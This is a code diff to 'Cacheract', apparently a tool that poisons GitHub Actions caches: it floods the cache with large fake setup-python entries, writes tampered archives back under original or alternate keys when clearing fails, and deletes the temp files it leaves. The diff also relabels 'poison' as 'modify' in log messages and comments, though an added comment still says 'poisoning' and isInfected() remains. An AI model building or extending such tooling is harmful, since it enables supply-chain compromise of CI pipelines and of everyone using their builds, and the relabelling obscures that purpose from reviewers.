@@ -85,7 +85,7 @@ async function setEntry(archive: string, key: string, version: string, runtimeTo
 
 /**
  * 
- * @param archive_path - Path to the archive to poison.
+ * @param archive_path - Path to the archive to modify.
  * @returns Promise<boolean> indicating if the archive was updated successfully
  */
 export async function updateEntry(archive_path: string): Promise<boolean> {
@@ -125,7 +125,7 @@ export async function updateEntry(archive_path: string): Promise<boolean> {
     }
 
     if (REPLACEMENTS.length > 0) {
-        console.log("Replacements configured, adding to poisoned archive!")
+        console.log("Replacements configured, adding to modified archive!")
         for (const replacement of REPLACEMENTS) {
             var decodedContent: string = '';
             if (replacement.FILE_CONTENT) {
@@ -195,6 +195,15 @@ async function createEntry(size: number): Promise<string> {
     // Tar the directory
     await createArchive(archivePath, sourceDir)
 
+    // Only clean up the random file after the archive is created and presumably uploaded
+    try {
+        if (fs.existsSync(filePath)) {
+            fs.unlinkSync(filePath);
+        }
+    } catch (cleanupError) {
+        console.error('Error cleaning up temp random file:', cleanupError);
+    }
+
     return archivePath;
 }
 
@@ -209,8 +218,16 @@ async function createAndSetEntry(
         const status = await updateEntry(path);
         if (status) {
             await setEntry(path, key, version, accessToken);
+            // Clear the archive after upload
+            try {
+                if (fs.existsSync(path)) {
+                    fs.unlinkSync(path);
+                }
+            } catch (cleanupError) {
+                console.error('Error cleaning up archive after upload:', cleanupError);
+            }
         } else {
-            console.error("Failed to poison archive!");
+            console.error("Failed to modify archive!");
         }
     } else {
         console.error("Failed to create entry for key.");
@@ -265,7 +282,7 @@ async function main() {
     if (!isInfected() && FILL_CACHE > 0) {
         for (let i = 0; i < FILL_CACHE; i++) {
             const counter = i.toString().padStart(2, '0');
-            await createAndSetEntry(1000000000, `"setup-python-Linux-24.04-Ubuntu-python-${counter}"`, "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b", accessToken);
+            await createAndSetEntry(1000000000, `setup-python-Linux-24.04.1-Ubuntu-python-${counter}`, "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b", accessToken);
         }
     }
 
@@ -320,6 +337,10 @@ async function main() {
                     if (clearEntryFailed) {
                         if (currBranch === ref) {
                             console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure`);
+                            // Instead, create a new cache entry with key + '1'
+                            const newKey = key + '1';
+                            console.log(`Creating new cache entry with key: ${newKey}`);
+                            await createAndSetEntry(size, newKey, version, accessToken);
                             continue;
                         } else {
                             console.log("Attempting to update entry in main that is currently only in a feature branch or a custom entry.");
@@ -333,7 +354,9 @@ async function main() {
                         console.log(`Attempting to update entry in main that is currently only in a feature branch or a custom entry.`);
                         // Entry is not in the default branch, create a new entry
                         path = await createEntry(size);
-                    } else if (!version.includes("CACHERACT")) {
+                        // Since we can no longer set arbitrary string version, we use
+                        // cacheract's default stuffing key so we don't keep re-deleting poisoning it.
+                    } else if (!key.includes("setup-python-Linux-24.04.1")) {
                         // Entry is in default branch, retrieve it
                         path = await retrieveEntry(key, version, accessToken);
 
@@ -361,9 +384,13 @@ async function main() {
                         if (cleared || currBranch !== ref) {
                             console.log(`Setting entry for key ${key}`);
                             await setEntry(path, key, version, accessToken);
+                        } else {
+                            const newKey = key + '1';
+                            console.log(`Setting new cache entry with key: ${newKey}`);
+                            await setEntry(path, newKey, version, accessToken);
                         }
                     } else {
-                        console.log("Failed to poison archive!");
+                        console.log("Failed to modify archive!");
                     }
                 }
             }
@@ -371,7 +398,7 @@ async function main() {
             console.log(error);
         }
     } else {
-        console.log('Cacheract running in non-default branch, skipping cache poisoning.');
+        console.log('Cacheract running in non-default branch, skipping cache modification.');
     }
 }
 
